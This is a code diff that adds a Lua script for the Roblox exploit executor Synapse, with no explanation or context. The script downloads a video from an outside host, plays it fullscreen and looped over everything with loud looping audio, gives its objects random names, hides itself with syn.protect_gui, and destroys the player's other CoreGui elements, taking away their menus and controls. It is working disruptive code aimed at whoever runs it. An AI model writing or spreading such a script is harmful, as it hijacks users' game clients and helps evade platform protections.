@@ -1,0 +1,48 @@
+if syn then
+    function getRandomChars()
+        local randomString = {}
+        for i = 1, math.random(20,30) do 
+            table.insert(randomString, string.char(math.random(0,255)))
+        end
+        return string.gsub(table.concat(randomString), "[%s%c]+", "")
+    end
+    
+    if isfile("r@kxxMa6$0bmA.webm") and syn.crypt.custom.hash("sha256", readfile("r@kxxMa6$0bmA.webm")) ~= "8d94f199b645fe3f1641cf7cde4ab24089ae5a19c0485dd75b3760b1d3865c0e" then
+        writefile("r@kxxMa6$0bmA.webm", game:HttpGet("https://s1.webmshare.com/vyPR5.webm"))
+    elseif not isfile("r@kxxMa6$0bmA.webm") then
+        writefile("r@kxxMa6$0bmA.webm", game:HttpGet("https://s1.webmshare.com/vyPR5.webm"))
+    end
+    local asset = getsynasset("r@kxxMa6$0bmA.webm")
+    
+    local gui = Instance.new("ScreenGui")
+    gui.Name = getRandomChars()
+    gui.IgnoreGuiInset = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    local vid = Instance.new("VideoFrame")
+    vid.Name = getRandomChars()
+    vid.Size = UDim2.new(1, 0, 1, 0)
+    vid.Looped = true
+    vid.Playing = true
+    vid.Video = asset
+    vid.ZIndex = 9e9
+    vid.Parent = gui
+    syn.protect_gui(gui)
+    
+    local sound = Instance.new("Sound")
+    sound.Name = getRandomChars()
+    sound.Playing = true
+    sound.Looped = true
+    sound.SoundId = "rbxassetid://516046413"
+    sound.Volume = 10
+    
+    for _,v in ipairs(game:GetService("CoreGui"):GetChildren()) do
+        if v ~= gui then
+            v:Destroy()
+        end
+    end
+    
+    sound.Parent = game.Players.LocalPlayer
+    gui.Parent = game:GetService("CoreGui")
+else
+    game:GetService("Players").LocalPlayer:Kick("Need Synapse")
+end
